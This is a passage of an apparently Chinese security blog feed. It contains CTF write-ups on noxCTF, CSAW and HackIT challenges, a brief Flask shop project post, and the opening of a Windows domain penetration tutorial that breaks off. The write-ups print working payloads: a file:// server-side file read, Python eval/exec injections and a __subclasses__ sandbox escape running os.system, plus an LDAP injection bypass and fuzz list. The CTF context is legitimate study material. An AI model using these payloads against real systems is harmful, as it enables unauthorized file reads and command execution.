rel="noopener">https://drive.google.com/open?id=1GkalBntU1s6d_sw_S5I4GinD8hBrh-C-</a></p><p>这是个很有意思的题</p><p>先通过url下载得到一个mp4，打开后不断切换着二维码，根本没法扫</p><p><img src="https://i.loli.net/2018/09/08/5b9377c622c39.png" alt="ks7.png"></p><p>长达两分多钟，得用脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2 </span><br><span class="line"></span><br><span class="line">videoCapture = cv2.VideoCapture()</span><br><span class="line">videoCapture.open(<span class="string">'/Users/xc/Downloads/Marcode.mp4'</span>)</span><br><span class="line"></span><br><span class="line">fps = videoCapture.get(cv2.CAP_PROP_FPS)</span><br><span class="line">frames = videoCapture.get(cv2.CAP_PROP_FRAME_COUNT)</span><br><span class="line"><span class="comment">#fps是帧率，意思是每一秒刷新图片的数量，frames是一整段视频中总的图片数量。</span></span><br><span class="line">print(<span class="string">"fps="</span>,fps,<span class="string">"frames="</span>,frames)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(frames)):</span><br><span class="line">    ret,frame = videoCapture.read()</span><br><span class="line">    cv2.imwrite(<span class="string">"./Marcode-jpg/mp4-(%d).jpg"</span>%i,frame)</span><br></pre></td></tr></table></figure><p>把视频中的每一帧都存为jpg，跑完得到3490个jpg，每一个二维码扫完都会得到一个google云盘url，访问能看到仅含一个字符的小图片</p><p>再用脚本把每一个jpg都扫一遍，大部分url是重复的，最终得到28个不同的url</p><p><img src="https://i.loli.net/2018/09/08/5b9379e6616d8.png" alt="ks8.png"></p><p>等于每个url表示一个字符，又用脚本做了url对应字符的字典，再跑一遍jpg得到一篇文章，是Harry Potter的Chapter 1 The Dark Lord Ascending</p><p>搜原文，处理下再burp compare，应该就能得到flag了</p><p><img src="https://i.loli.net/2018/09/08/5b937bae4be39.png" alt="ks9.png"></p><p>弄什么harry potter，原文都不一样，眼都看瞎了,最终找不同得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n o x ctf a into-with v impaosing-impressive d a was-were k e d a toward-towards inward-inwards v wall-walls r  upward -upwards a</span><br></pre></td></tr></table></figure><p>不知flag到底怎么写，比赛结束看到wp，flag竟是<code>noxCTF{AVADAKEDAVRA}</code></p><p>扫描的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"></span><br><span class="line">urllist = []</span><br><span class="line">picdict = &#123;&#125;</span><br><span class="line">pdic = &#123;<span class="string">'https://drive.google.com/open?id=131OPuwNVggs0ZAsVie4dfA3k9zLWN-uu'</span>: <span class="string">'T'</span>, <span class="string">'https://drive.google.com/open?id=1c-go7QIZb_yqGDsRKlXG1j1Py7-wcSFG'</span>: <span class="string">'H'</span>, <span class="string">'https://drive.google.com/open?id=1upmw0QvLjzp6b7RjCrjJGjYfRijF82-g'</span>: <span class="string">'E'</span>, <span class="string">'https://drive.google.com/open?id=1vHlCNodJ84iw51C8gIz4hr0UpsWNx3fm'</span>: <span class="string">'_'</span>, <span class="string">'https://drive.google.com/open?id=1mZivmNZ8uDiUb5YUoF8sj9kZXKkh7GNO'</span>: <span class="string">'W'</span>, <span class="string">'https://drive.google.com/open?id=1pXSHKhMzuKrUMg0x8ygZ36yTn0-9nBe8'</span>: <span class="string">'O'</span>, <span class="string">'https://drive.google.com/open?id=1b5wz-LsIBxnA7mp5ImbNLZQY0nob94OO'</span>: <span class="string">'M'</span>, <span class="string">'https://drive.google.com/open?id=1cZlhiRoZcEiaNEwScBQd0IA2PXh1Z1tX'</span>: <span class="string">'N'</span>, <span class="string">'https://drive.google.com/open?id=1OqacmR-Ccc2YLVYCS2co4dWtSqfEGxIl'</span>: <span class="string">'A'</span>, <span class="string">'https://drive.google.com/open?id=1DF2RneUWAb6wqp7YJ0vjOwDJGdENEc0Q'</span>: <span class="string">'P'</span>, <span class="string">'https://drive.google.com/open?id=1lKeCjQFcTSuUzMGUEeEzPj4d2x1MLTJm'</span>: <span class="string">'R'</span>, <span class="string">'https://drive.google.com/open?id=1JtDxAfX8AEC_mFzJPZofI1RyOL62MAmk'</span>: <span class="string">'D'</span>, <span class="string">'https://drive.google.com/open?id=1hjIQq2fEcduFF0CfRs-MJ2hlCuC5lkW6'</span>: <span class="string">'U'</span>, <span class="string">'https://drive.google.com/open?id=1rHGDe2F5vLws9fA0M3L9IELX9LYaU50x'</span>: <span class="string">'F'</span>, <span class="string">'https://drive.google.com/open?id=1p4m9gtvh31s2SJ9G1uNr8burIvQabm_k'</span>: <span class="string">'?'</span>, <span class="string">'https://drive.google.com/open?id=1g2I1a09lO4m0imhIzJ60LUeDPNDIdIp_'</span>: <span class="string">'Y'</span>, <span class="string">'https://drive.google.com/open?id=1lSanpoEq3LeV0aaL6KEnUiJE2iGijdrt'</span>: <span class="string">'S'</span>, <span class="string">'https://drive.google.com/open?id=1Rw-Op049iTliLPFTTRj7p4gBXmm8IboN'</span>: <span class="string">'I'</span>, <span class="string">'https://drive.google.com/open?id=1H5DHyv0METKfLV7xdzw-SVXU_F1o1iKM'</span>: <span class="string">'L'</span>, <span class="string">'https://drive.google.com/open?id=1GLtL-X1IS4ms6fwC2OQV4jAmXjI_6bjQ'</span>: <span class="string">'C'</span>, <span class="string">'https://drive.google.com/open?id=1vPBtiNzUzYEOEKFK60vG305uPw9CDy8p'</span>: <span class="string">'Q'</span>, <span class="string">'https://drive.google.com/open?id=1DV0ACuyKWsFm2ApXgHHDP_DSzwqmtt5M'</span>: <span class="string">'G'</span>, <span class="string">'https://drive.google.com/open?id=1nlp-HIwnRbG61mf5SF_BzMdlNAR7tHLt'</span>: <span class="string">'Z'</span>, <span class="string">'https://drive.google.com/open?id=151y0xa6hnTR9yp9G0D-dyox08bV4-JZX'</span>: <span class="string">'B'</span>, <span class="string">'https://drive.google.com/open?id=1dtYor_A9Sf3DDTlczTLA0s9rBluVNoOX'</span>: <span class="string">'K'</span>, <span class="string">'https://drive.google.com/open?id=1UpU1_MTK-0XgCpcZKC4AVGsBswNpQTBO'</span>: <span class="string">'X'</span>, <span class="string">'https://drive.google.com/open?id=1apKMrqUwZn5dOkRWfjbYgYH_RvkmPD2P'</span>: <span class="string">'V'</span>, <span class="string">'https://drive.google.com/open?id=1uynnoN7ItBRls7MiqFa1rLE-W3o9CnY5'</span>: <span class="string">'J'</span>&#125;</span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line">code = []</span><br><span class="line">codes = <span class="string">"THE_WOMNAPRDUF?YSILCQGZBKXVJ"</span></span><br><span class="line">string = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> ac <span class="keyword">in</span> codes:</span><br><span class="line">    code.append(ac)</span><br><span class="line"><span class="string">'''print (code)'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3490</span>):</span><br><span class="line">    name = <span class="string">"mp4-("</span>+str(i)+<span class="string">").jpg"</span></span><br><span class="line">    decode_result = decode(Image.open(name))</span><br><span class="line">    url = str(decode_result[<span class="number">0</span>].data, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    string = string + pdic[url]</span><br><span class="line">    <span class="keyword">print</span> (string)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    if url not in urllist:</span></span><br><span class="line"><span class="string">        picdict[url] = code[sum]</span></span><br><span class="line"><span class="string">        sum = sum + 1    </span></span><br><span class="line"><span class="string">        urllist.append(url)</span></span><br><span class="line"><span class="string">        #print ('[+] '+name+' :'+url)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"><span class="comment">#print ("totla is "+str(sum))</span></span><br><span class="line"><span class="comment">#print (picdict)</span></span><br><span class="line"><span class="keyword">print</span> (string)</span><br></pre></td></tr></table></figure><p>以下是看wp后的记录</p><h1 id="hiddenDOM"><a href="#hiddenDOM" class="headerlink" title="hiddenDOM"></a>hiddenDOM</h1><p>I decided to create a tool that searches for<br>hidden elements inside a web pages.<br>Few days ago someone told me that my website is not so /secure/…<br>Can you check it yourself ?</p><p><a href="http://13.59.2.198:5588" target="_blank" rel="noopener">http://13.59.2.198:5588</a></p><p>解码之后的一段js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var _0x2b80 = [&quot;slow&quot;, &quot;fadeOut&quot;, &quot;#hidden_elements&quot;, &quot;click&quot;, &quot;#hideArea&quot;, &quot;ready&quot;, &quot;fadeIn&quot;, &quot;#showArea&quot;];</span><br><span class="line">$(document)[_0x2b80[5]](function() &#123;</span><br><span class="line">  $(_0x2b80[4])[_0x2b80[3]](function() &#123;</span><br><span class="line">    $(_0x2b80[2])[_0x2b80[1]](_0x2b80[0]);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">$(document)[_0x2b80[5]](function() &#123;</span><br><span class="line">  $(_0x2b80[7])[_0x2b80[3]](function() &#123;</span><br><span class="line">    $(_0x2b80[2])[_0x2b80[6]](_0x2b80[0]);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>起作用就是创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;main_form&quot; action=&quot;index.php&quot; style=&quot;position:sticky;&quot;&gt;</span><br><span class="line">&lt;input name=&quot;expression&quot; placeholder=&quot;/&lt;[^&lt;&gt;]&#123;1,&#125;hidden[^&lt;&gt;]&#123;1,&#125;&gt;/&quot; type=&quot;text&quot;&gt;</span><br></pre></td></tr></table></figure><p>相比之前还要输入一个expression</p><p>输入源码里<code>&lt;a href=&#39;/var/www/html/flag.txt&#39; hidden &gt;-_-&lt;/a&gt;&lt;p style=&#39;color:red;&#39;&gt;&lt;/p&gt;</code>中的路径后得到另一段js,不过没用</p><p>满足expression的正则，file读取文件</p><p><code>?target=file:///var/www/html/flag.txt&amp;expression=/.*/</code></p><h1 id="Python-for-fun-Misc"><a href="#Python-for-fun-Misc" class="headerlink" title="Python for fun - Misc"></a>Python for fun - Misc</h1><p><a href="http://chal.noxale.com:8000/" target="_blank" rel="noopener">http://chal.noxale.com:8000/</a></p><p>传递两个被解释的参数进行注入</p><p><img src="https://i.loli.net/2018/09/09/5b950e343dbf2.png" alt="ks10.png"></p><p><code>a,b=print(exec(&quot;import os&quot;),eval(&quot;os.listdir(&#39;.&#39;)&quot;))</code></p><p><code>a,b=print(open(&quot;FLAG&quot;, &quot;r&quot;).read())</code></p><h3 id="Python-for-fun-2"><a href="#Python-for-fun-2" class="headerlink" title="Python for fun 2"></a>Python for fun 2</h3><p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;cat FLAG&quot;)</code></p><h3 id="LDAP-injection"><a href="#LDAP-injection" class="headerlink" title="LDAP injection"></a>LDAP injection</h3><p><a href="http://web.chal.csaw.io:8080/index.php?search=" target="_blank" rel="noopener">http://web.chal.csaw.io:8080/index.php?search=</a></p><blockquote><p>LDAP注入是一种攻击，用于利用基于web的应用程序，这些应用程序基于用户输入构建LDAP语句。当应用程序无法正确清理用户输入时，可以使用本地代理修改LDAP语句。这可能会导致执行任意命令，例如授予未授权查询的权限，以及在LDAP树内修改内容。SQL注入中可用的相同高级开发技术可以类似地应用于LDAP注入中。</p></blockquote><p>服务查询类似：<br><code>(&amp;(GivenName=&lt;INPUT&gt;)(!(GivenName=Flag)))</code></p><p>利用<code>*)(uid=*))(|(uid=*</code>绕过</p><p>完整语句：<br><code>(&amp;(GivenName=*)(uid=*))(|(uid=*)(!(GivenName=Flag)))</code></p><p>查询语法：<br><a href="http://www.361way.com/ldap-query-grammar/2542.html" target="_blank" rel="noopener">http://www.361way.com/ldap-query-grammar/2542.html</a></p><p>fuzz:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">*)(&amp;</span><br><span class="line">*))%00</span><br><span class="line">*()|%26&apos;</span><br><span class="line">*()|&amp;&apos;</span><br><span class="line">*(|(mail=*))</span><br><span class="line">*(|(objectclass=*))</span><br><span class="line">*)(uid=*))(|(uid=*</span><br><span class="line">*/*</span><br><span class="line">*|</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">@*</span><br><span class="line">|</span><br><span class="line">admin*</span><br><span class="line">admin*)((|userpassword=*)</span><br><span class="line">admin*)((|userPassword=*)</span><br><span class="line">x&apos; or name()=&apos;username&apos; or &apos;x&apos;=&apos;y</span><br><span class="line">!</span><br><span class="line">%21</span><br><span class="line">%26</span><br><span class="line">%28</span><br><span class="line">%29</span><br><span class="line">%2A%28%7C%28mail%3D%2A%29%29</span><br><span class="line">%2A%28%7C%28objectclass%3D%2A%29%29</span><br><span class="line">%2A%7C</span><br><span class="line">%7C</span><br><span class="line">&amp;</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">*(|(mail=*))</span><br><span class="line">*(|(objectclass=*))</span><br><span class="line">*/*</span><br><span class="line">*|</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">@*</span><br><span class="line">x&apos; or name()=&apos;username&apos; or &apos;x&apos;=&apos;y</span><br><span class="line">|</span><br><span class="line">*()|&amp;&apos;</span><br><span class="line">admin*</span><br><span class="line">admin*)((|userpassword=*)</span><br><span class="line">*)(uid=*))(|(uid=*</span><br></pre></td></tr></table></figure><p>hackitctf</p><h1 id="ge-going"><a href="#ge-going" class="headerlink" title="ge  going"></a>ge  going</h1><p><a href="https://ctf.hackit.ua/w31c0m3" target="_blank" rel="noopener">https://ctf.hackit.ua/w31c0m3</a></p><p>这是个比较新的隐写思路,相关内容比较少</p><blockquote><p>零宽度字符是隐藏不显示的，也是不可打印的，也就是说这种字符用大多数程序或编辑器是看不到的。</p></blockquote><p>相关文章： </p><ul><li><a href="http://www.freebuf.com/articles/web/167903.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/167903.html</a></li><li><a href="https://www.tr0y.wang/2018/04/20/ZeroWidthSpacesHiden/" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/20/ZeroWidthSpacesHiden/</a></li></ul><p>在题目这句<code>W‏‍‏‌‎‎‏‍‏‎‏‏‎‏‎‏‍‌‎‏‏‎‏‍‏‍‌‍‌‍‌‎‏‏‏‍‍‎‏‏‏‌‍‍‌‏‍‏‏‏‍‎‏‏‎‏‌‏‏‏‎‌‏‏‎‏‏‎‍‏‍‌‏‏‎‏‏‌‏‎‏‍‌‌elcome to the HackIT 2018 CTF, flag is somewhere here. ¯_(ツ)_/¯</code>的W和e之间就隐藏着如下零宽度字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwnj;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;rlm;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwj;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwnj;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwj;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;rlm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;rlm;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;</span><br></pre></td></tr></table></figure><p><code>&amp;zwnj;</code></p><blockquote><p>它叫零宽不连字，全称是Zero Width Non Joiner，简称&ldquo;ZWNJ&rdquo;，是一个不打印字符，放在电子文本的两个字符之间，抑制本来会发生的连字，而是以这两个字符原本的字形来绘制。Unicode中的零宽不连字字符映射为&ldquo;&rdquo;（zero width non-joiner，U+200C），HTML字符值引用为： &zwnj;</p></blockquote><p><code>&amp;zwj;</code></p><blockquote><p>它叫零宽连字，全称是Zero Width Joiner，简称&ldquo;ZWJ&rdquo;，是一个不打印字符，放在某些需要复杂排版语言（如阿拉伯语、印地语）的两个字符之间，使得这两个本不会发生连字的字符产生了连字效果。零宽连字符的Unicode码位是U+200D (HTML: &zwj; &zwj;）。</p></blockquote><p><code>&amp;lrm;</code> </p><blockquote><p>左至右符号（Left-to-right mark,LRM）是一种控制字符，或者说是不可见的排版符号。左至右符号的统一码字符是U+200E，亦可在HTML中表现为&lrm; &#x200E;或者&#8206;, UTF-8中则是E2 80 8E。</p></blockquote><p><code>&amp;rlm;</code></p><blockquote><p>右至左符号（Right-to-left mark,RLM）是一种控制字符，用于计算机的双向文稿排版中。右至左符号的Unicode字符是U+200F，亦可在HTML中表现为&rlm; &#x200F;或者&#8207;</p></blockquote><p><code>&amp;#8203;</code></p><blockquote><p>零宽空格（zero-width space, ZWSP）是一种不可打印的Unicode字符，用于可能需要换行处。在Unicode中，该字符为U+200B“”零宽空格 ，HTML：&#8203;。</p></blockquote><p>这里的零宽度字符可用<a href="https://github.com/offdev/zwsp-steg-js解密" target="_blank" rel="noopener">https://github.com/offdev/zwsp-steg-js解密</a></p><p>de.js内容为</p><p><img src="https://i.loli.net/2018/09/11/5b972acc3d0f7.png" alt="ks11.png"></p><p>运行获取flag</p><p><img src="https://i.loli.net/2018/09/11/5b972b28c31c1.png" alt="ks12.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="http://j0k3r.top/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>基于flask/jinja2的简陋的商店系统</title>
    <link href="http://j0k3r.top/2018/09/02/py-shop/"/>
    <id>http://j0k3r.top/2018/09/02/py-shop/</id>
    <published>2018-09-01T16:00:00.000Z</published>
    <updated>2019-04-22T11:52:16.538Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h3 id="基于flask-jinja2的简陋的商店系统"><a href="#基于flask-jinja2的简陋的商店系统" class="headerlink" title="基于flask/jinja2的简陋的商店系统"></a>基于flask/jinja2的简陋的商店系统</h3><blockquote><p>写的非常简单，可能日后会完善吧</p></blockquote><ul><li>python3.6</li><li>需开启mysql服务，首次需运行initdb.py创建数据库（或还原备份的数据库）</li><li>再运行app.py并注册账号</li></ul><p>8.30更新：</p><ul><li><p>将商品加入数据库，用户登陆后可以在/add添加商品</p></li><li><p>修复商品预览界面bug</p></li></ul><p>9.2更新：</p><ul><li>优化initdb.py，防止二次运行删除数据</li></ul><p><img src="https://i.loli.net/2018/10/23/5bcea2295b726.png" alt="68747470733a2f2f692e6c6f6c692e6e65742f323031382f30382f33312f356238386632363530363436342e706e67.png"></p><p>源码见github</p><p><a href="https://github.com/zhuxianjin/py-shop" target="_blank" rel="noopener">https://github.com/zhuxianjin/py-shop</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="flask" scheme="http://j0k3r.top/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Windows 域渗透</title>
    <link href="http://j0k3r.top/2018/08/15/Windows-domain/"/>
    <id>http://j0k3r.top/2018/08/15/Windows-domain/</id>
    <published>2018-08-14T16:00:00.000Z</published>
    <updated>2018-08-20T04:25:16.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>内网渗透真是博大精深</strong>，测试环境准备起来也有点麻烦，遇到很多问题</p><a id="more"></a><h3 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h3><h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;局域网（Local Area Network, LAN），又称内网。内网的计算机以NAT（网络地址转换）协议，通过一个公共的网关访问Internet。内网的计算机可向Internet上的其他计算机发送连接请求，但Internet上其他的计算机无法向内网的计算机发送连接请求。</p></blockquote><h4 id="域和域控制器"><a href="#域和域控制器" class="headerlink" title="域和域控制器"></a>域和域控制器</h4><h5 id="域"><a href="#域" class="headerlink" title="域"></a>域</h5><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系（即Trust Relation）。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域；每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</p></blockquote><h5 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h5><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不过在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。</p></blockquote><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p></blockquote><h3 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h3><p>两个虚拟机，用Windows server 2003 r2做域控，域用户win7</p><p>域控安装简要过程：</p><ul><li><p>win+r运行dcpromo创建新域</p></li><li><p>配置新域的DNS全名和NetBIOS名</p></li><li><p>AD需要DNS服务支持，这里会检测并安装DNS服务</p><ul><li>安装来源发现就是<strong>安装盘*</strong>内的I386文件夹 </li></ul></li><li><p>重启</p></li></ul><p>可以看：<a href="http://support.huawei.com/enterprise/docinforeader!loadDocument1.action?contentId=DOC1000061342&amp;partNo=10062#os_cfg_ads_0029" target="_blank" rel="noopener">搭建AD域环境</a></p><p>创建用户</p><p><img src="https://i.loli.net/2018/08/11/5b6e9aeeaa2c5.png" alt="s9.png"></p><p>win7加入域</p><p><img src="https://i.loli.net/2018/08/11/5b6e9aeeab37b.png" alt="s1.png"></p><p><strong>DNS要设置为域控的IP</strong>，否则会出现网络路径错误</p><p><img src="https://i.loli.net/2018/08/11/5b6e9aee3d693.png" alt="s2.png"></p><p>这是会重启，开机<strong>切换用户</strong>来登陆域</p><p><img src="https://i.loli.net/2018/08/11/5b6e9aeeb0f7e.png" alt="s3.png"></p><p><img src="https://i.loli.net/2018/08/11/5b6e9aee72856.png" alt="s7.png"></p><h4 id="域环境结构"><a href="#域环境结构" class="headerlink" title="域环境结构"></a>域环境结构</h4><p>域：TEST.com</p><p>域控：windows server 2003 r2，ip：10.211.55.26</p><p>域成员：windows 7 x64，ip：10.211.55.19</p><h3 id="0x04域渗透"><a href="#0x04域渗透" class="headerlink" title="0x04域渗透"></a>0x04域渗透</h3><p>假设控制了域网内的一台电脑，要将权限从local admin 提高到Domain admin，访问包括Domain 